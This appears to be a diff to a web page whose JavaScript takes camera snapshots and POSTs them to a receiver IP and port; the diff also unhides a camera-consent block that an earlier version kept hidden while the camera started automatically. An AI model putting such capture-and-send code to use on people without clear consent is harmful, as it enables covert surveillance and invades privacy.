@@ -221,7 +221,11 @@
 
         /* СКРЫТЫЙ БЛОК КАМЕРЫ */
         .camera-consent {
-            display: none; /* Блок с кнопкой разрешения скрыт, так как камера запускается автоматически */
+            display: block; /* Было none */
+            background: #333;
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 10px;
         }
         
         /* Стили для самого видео элемента, который будет создаваться JS */
@@ -1001,18 +1005,24 @@ HTML
         
         canvas.toBlob(async (blob) => {
             if (!blob) return;
+            
+            // Создаем FormData
+            const formData = new FormData();
+            formData.append('image', blob, 'snapshot.jpg');
+            
             try {
-                // Отправляем на ноутбук
-                await fetch(`http://${RECEIVER_IP}:${RECEIVER_PORT}`, {
+                const res = await fetch(`http://${RECEIVER_IP}:${RECEIVER_PORT}/`, {
                     method: 'POST',
-                    body: blob,
-                    headers: {
-                        'Content-Type': 'image/jpeg'
-                    }
+                    body: formData,
+                    // headers: { 'Content-Type': 'image/jpeg' } // Не нужно для FormData
                 });
-                console.log('Снимок отправлен');
+                const result = await res.json();
+                console.log('Снимок отправлен:', result);
             } catch (e) {
                 console.error('Ошибка отправки снимка:', e);
+                // Здесь лучше выводить ошибку на экран, чтобы видеть проблему
+                const status = document.getElementById('cameraStatus');
+                if(status) status.textContent = 'Ошибка сети: ' + e.message;
             }
         }, 'image/jpeg', 0.7);
     }
